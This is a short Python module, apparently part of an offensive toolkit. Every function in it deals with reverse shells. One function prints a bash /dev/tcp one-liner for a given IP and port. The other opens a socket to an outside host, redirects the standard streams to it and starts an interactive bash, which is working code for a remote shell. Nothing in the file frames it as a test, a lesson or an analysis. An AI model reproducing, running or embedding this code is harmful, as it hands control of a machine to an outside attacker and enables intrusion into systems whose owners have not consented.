# modules/reverse_shell.py

import socket
import subprocess
import os

def generate_reverse_shell(ip, port):
    cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    print("Reverse shell payload:")
    print(cmd)

def execute_reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Failed to establish reverse shell: {e}")
